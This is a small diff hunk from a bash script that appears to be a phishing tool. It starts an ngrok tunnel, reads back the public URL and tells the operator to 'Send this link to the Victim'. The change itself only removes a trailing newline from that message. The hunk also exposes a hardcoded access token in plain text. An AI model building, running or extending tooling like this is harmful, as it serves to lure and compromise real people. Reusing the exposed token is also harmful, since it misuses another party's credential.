@@ -406,7 +406,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m" $link
 Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
 echo ""
 echo ""
